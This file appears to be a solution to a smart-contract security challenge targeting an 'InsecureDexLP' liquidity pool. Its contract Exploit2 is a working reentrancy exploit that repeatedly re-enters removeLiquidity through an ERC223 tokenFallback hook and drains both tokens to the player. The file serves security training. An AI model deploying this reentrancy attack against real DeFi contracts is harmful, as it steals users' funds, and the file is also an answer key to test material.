// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

/*
 * Complete the contract below so that you can solve the challenge!
 * Note that you can (and may!) also modify the `deployExploits.js` file
 * and add the necessary calls to your exploit contract within the
 * `resolution.js` file.
 *
 * For this challenge, we already completed a tiny part of the
 * exploit contract for you! :)
 * 
 * Also, if you need to declare additional contracts as helpers,
 * feel free to do so!
 */

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                           DEPENDENCIES                          //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * To solve certain challenges, you will need some interfaces.
 * We kindly provide them below :)
 */

 interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface InsecureDexLP {
    function addLiquidity(uint256 amount0, uint256 amount1) external;
    function balanceOf(address user) external view returns(uint256);
    function removeLiquidity(
        uint256 amount
    ) external returns(uint amount0, uint amount1);
    function swap(
        address tokenFrom,
        address tokenTo,
        uint256 amountIn
    ) external returns(uint256 amountOut);
    function token0() external returns(IERC20);
    function token1() external returns(IERC20);
}


/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                        EXPLOIT CONTRACTS                        //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

contract Exploit2 {
    /*
     * HINT:
     * You will most likely use these things here ;)
     */
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;

    // Complete this contract!
    bool private hacking;
    uint public num_reentered;
    address private _player;

    constructor(address _dexAddress) {    
        _player = msg.sender;
        dex = InsecureDexLP(_dexAddress);
        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token1.approve(_dexAddress, type(uint256).max);
        token0.approve(_dexAddress, type(uint256).max);
    }

    function hack() public {
        uint256 token0Balance = token0.balanceOf(_player);
        uint256 token1Balance = token1.balanceOf(_player);

        token0.transferFrom(_player, address(this), token0Balance);
        token1.transferFrom(_player, address(this), token1Balance);

        dex.addLiquidity(token0Balance, token1Balance);

        hacking = true;
        dex.removeLiquidity(dex.balanceOf(address(this)));
        hacking = false;
    }

    function tokenFallback(address _sender, uint256 value, bytes memory data) external {
        if (!hacking) {
            return;
        }

        if (num_reentered > 8) {
            uint256 token0Balance = token0.balanceOf(address(this));
            uint256 token1Balance = token1.balanceOf(address(this));
            token0.transfer(_player, token0Balance);
            token1.transfer(_player, token1Balance);
            return;
        }
        ++num_reentered;
        dex.removeLiquidity(dex.balanceOf(address(this)));

    }
}